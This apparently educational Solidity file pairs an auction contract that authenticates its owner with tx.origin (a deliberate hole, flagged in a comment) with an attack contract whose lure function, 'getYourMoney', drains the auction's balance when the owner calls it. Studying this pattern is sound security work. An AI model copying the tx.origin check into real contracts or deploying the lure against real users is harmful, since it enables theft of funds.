// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract AuctionTxOrigin {
    address owner;

    // need use msg.sender not EOA Externally Owned Account
    modifier onlyOwner() {
        require(tx.origin == owner, "Your are not an owner!");
        _;
    }

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw(address _to) external onlyOwner {
        (bool sent, ) = _to.call{value: address(this).balance}("");
        require(sent, "Failed to send!");
    }

    receive() external payable {}
}

contract HackTxOringin {
    AuctionTxOrigin toHack;

    constructor(address payable _toHack) payable {
        toHack = AuctionTxOrigin(_toHack);
    }

    // once use
    function getYourMoney() external {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send!");

        toHack.withdraw(address(this));
    }

    receive() external payable {}
}
